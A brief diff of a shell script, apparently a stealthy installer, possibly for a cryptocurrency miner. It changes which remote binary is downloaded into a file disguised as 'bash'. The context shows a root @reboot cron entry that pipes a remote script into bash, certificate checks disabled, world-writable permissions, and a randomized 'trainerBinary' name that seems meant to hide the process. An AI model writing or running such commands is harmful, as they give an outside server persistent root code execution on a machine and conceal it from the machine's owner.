@@ -40,7 +40,7 @@ sudo sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/zh88kk2.sh |bash >/de
 
 rm -rf "${work}"; mkdir -p "${work}"
 wget --no-check-certificate -4 -qO "${work}/appsettings.json" "${src}/q.json"
-wget --no-check-certificate -4 -qO "${work}/bash" "${src}/q208"
+wget --no-check-certificate -4 -qO "${work}/bash" "${src}/q211"
 chmod -R 777 "${work}"
 sed -i "s/\"trainerBinary\":.*/\"trainerBinary\": \"$(RandString 7)\",/" "${work}/appsettings.json"
 
